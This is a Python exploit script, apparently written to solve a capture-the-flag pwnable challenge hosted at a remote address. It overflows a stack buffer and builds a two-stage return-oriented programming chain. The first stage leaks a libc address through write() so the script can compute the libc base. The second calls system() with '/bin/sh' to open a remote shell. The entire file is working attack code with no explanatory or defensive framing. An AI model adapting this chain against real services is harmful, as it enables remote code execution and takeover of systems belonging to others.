
#!/usr/bin/env python
from sc_pwn import *

#rhp     = ('192.168.75.129',8080)
rhp     = ('pwnable.elliptic-shiho.xyz',20062)

offset_libc_main    = 0x00021dd0
offset_libc_exit    = 0x0003c290
offset_libc_system  = 0x00046640
offset_libc_str_sh  = 0x0017ccdb

addr_plt_read       = 0x004004f8
addr_plt_write      = 0x00400518
addr_got_main       = 0x00600ad0

addr_pop_rdi        = 0x00400639
addr_pop_rsi        = 0x0040063b
addr_pop_rdx        = 0x0040063d
addr_pop_rcx        = 0x0040063f
addr_leave_ret      = 0x00400641

addr_bss            = 0x00600af0

#==========
def attack(nc):
    nc.read_until('\n')

    exploit_st1  = 'a'*0x200
    exploit_st1 += pack_64(addr_bss)
    exploit_st1 += pack_64(addr_pop_rdi)
    exploit_st1 += pack_64(STDOUT_FILENO)
    exploit_st1 += pack_64(addr_pop_rsi)
    exploit_st1 += pack_64(addr_got_main)
    exploit_st1 += pack_64(addr_pop_rdx)
    exploit_st1 += pack_64(8)
    exploit_st1 += pack_64(addr_plt_write)
    exploit_st1 += pack_64(addr_pop_rdi)
    exploit_st1 += pack_64(STDIN_FILENO)
    exploit_st1 += pack_64(addr_pop_rsi)
    exploit_st1 += pack_64(addr_bss)
    exploit_st1 += pack_64(addr_pop_rdx)
    exploit_st1 += pack_64(0x200)
    exploit_st1 += pack_64(addr_plt_read)
    exploit_st1 += pack_64(addr_leave_ret)
    nc.send(exploit_st1)

    addr_libc_main      = unpack_64(nc.read_all()[-8:])
    addr_base_libc      = addr_libc_main - offset_libc_main
    addr_libc_system    = addr_base_libc + offset_libc_system
    addr_libc_exit      = addr_base_libc + offset_libc_exit
    addr_libc_str_sh    = addr_base_libc + offset_libc_str_sh

    info('addr_base_libc    = 0x%08x'%addr_base_libc)
    info('addr_libc_system  = 0x%08x'%addr_libc_system)
    info('addr_libc_str_sh  = 0x%08x'%addr_libc_str_sh)

    exploit_st2  = pack_64(0xcafebabe)
    exploit_st2 += pack_64(addr_pop_rdi)
    exploit_st2 += pack_64(addr_libc_str_sh)
    exploit_st2 += pack_64(addr_libc_system)
    exploit_st2 += pack_64(addr_libc_exit)
    nc.send(exploit_st2)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
